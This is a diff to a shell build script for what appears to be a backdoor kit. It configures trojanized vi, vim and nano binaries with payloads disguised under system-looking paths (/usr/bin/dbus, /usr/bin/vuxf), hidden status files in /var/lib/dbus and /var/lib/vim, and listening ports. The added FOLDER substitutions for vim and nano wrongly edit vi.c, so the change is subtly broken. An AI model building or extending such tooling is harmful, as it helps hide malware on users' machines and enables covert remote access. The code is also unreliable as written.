@@ -1,4 +1,5 @@
 #VI
+VI_FOLDER="/var/lib/vim/"
 VI_STATUS="/var/lib/vim/vi-process"
 VI_PAYLOAD="/usr/bin/dvi"
 VI_ERROR="/var/lib/vim/vi-err"
@@ -7,6 +8,7 @@ VI_EDITOR="/usr/bin/vi"
 VI_PORT="5004"
 
 #VIM
+VIM_FOLDER="/var/lib/vim/"
 VIM_STATUS="/var/lib/vim/process"
 VIM_PAYLOAD="/usr/bin/vuxf"
 VIM_ERROR="/var/lib/vim/err"
@@ -15,6 +17,7 @@ VIM_EDITOR="/usr/bin/vim"
 VIM_PORT="5005"
 
 #NANO
+NANO_FOLDER="/var/lib/dbus/"
 NANO_STATUS="/var/lib/dbus/machine-process"
 NANO_PAYLOAD="/usr/bin/dbus"
 NANO_ERROR="/var/lib/dbus/err"
@@ -34,6 +37,7 @@ sed -i "s#{PAYLOAD}#$VI_PAYLOAD#" vi.c
 sed -i "s#{ERROR}#$VI_ERROR#" vi.c
 sed -i "s#{BINARYNAME}#$VI_BINARYNAME#" vi.c
 sed -i "s#{EDITOR}#$VI_EDITOR#" vi.c
+sed -i "s#{FOLDER}#$VI_FOLDER#" vi.c
 sed -i "s#6969#$VI_PORT#" vi.c
 
 #VIM
@@ -42,6 +46,7 @@ sed -i "s#{PAYLOAD}#$VIM_PAYLOAD#" vim.c
 sed -i "s#{ERROR}#$VIM_ERROR#" vim.c
 sed -i "s#{BINARYNAME}#$VIM_BINARYNAME#" vim.c
 sed -i "s#{EDITOR}#$VIM_EDITOR#" vim.c
+sed -i "s#{FOLDER}#$VIM_FOLDER#" vi.c
 sed -i "s#6969#$VIM_PORT#" vim.c
 
 #NANO
@@ -50,6 +55,7 @@ sed -i "s#{PAYLOAD}#$NANO_PAYLOAD#" nano.c
 sed -i "s#{ERROR}#$NANO_ERROR#" nano.c
 sed -i "s#{BINARYNAME}#$NANO_BINARYNAME#" nano.c
 sed -i "s#{EDITOR}#$NANO_EDITOR#" nano.c
+sed -i "s#{FOLDER}#$NANO_FOLDER#" vi.c
 sed -i "s#6969#$NANO_PORT#" nano.c
 
 #Compile binaries
